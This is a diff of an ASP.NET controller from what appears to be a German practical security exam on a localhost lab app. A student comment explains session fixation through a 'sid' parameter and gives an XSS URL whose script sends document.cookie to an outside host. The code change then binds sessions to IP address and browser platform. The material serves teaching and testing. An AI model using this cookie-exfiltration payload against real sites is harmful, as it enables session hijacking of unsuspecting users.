@@ -19,6 +19,18 @@ namespace Pruefung_Praktisch_Musterloesung.Controllers
         * 
         * ANTWORTEN BITTE HIER
         * 
+        * Aufgabe 1.
+        *   Session Fixation: Ich kann mittels dem "sid"-Paramater den Link jemand anderem den Link zusenden, diesen Einloggen lassen
+        *   und so die Session übernehmen bzw. die privaten Daten sehen
+        *   http://localhost:50374/Lab2/Index?sid=8c5324635a7c2899d6e0710cc7a3b4bda602889d
+        *   
+        *   Cookie mit Javascript abgreifen:
+        *   Da die Session-ID in der View direkt in die Form geschrieben wird könnte man die Form aushebeln und eine XSS-Attacke machen.
+        *   Das würde in etwas so funktionieren.
+        *   http://localhost:50374/Lab2/Login?sid="<script>$.get("http://myserver.com/xd.php?=" + document.cookie)</script>
+        *   Somit könnte der Angreifer die Sessionn des anderen übernehmen
+        *   
+        * 
         * */
 
         public ActionResult Index() {
@@ -43,15 +55,11 @@ namespace Pruefung_Praktisch_Musterloesung.Controllers
             var password = Request["password"];
             var sessionid = Request.QueryString["sid"];
 
-            // hints:
-            //var used_browser = Request.Browser.Platform;
-            //var ip = Request.UserHostAddress;
-
             Lab2Userlogin model = new Lab2Userlogin();
 
-            if (model.checkCredentials(username, password))
+            if (model.checkCredentials(username, password, Request.UserHostAddress, Request.Browser.Platform))
             {
-                model.storeSessionInfos(username, password, sessionid);
+                model.storeSessionInfos(username, password, sessionid, Request.UserHostAddress, Request.Browser.Platform);
 
                 HttpCookie c = new HttpCookie("sid");
                 c.Expires = DateTime.Now.AddMonths(2);
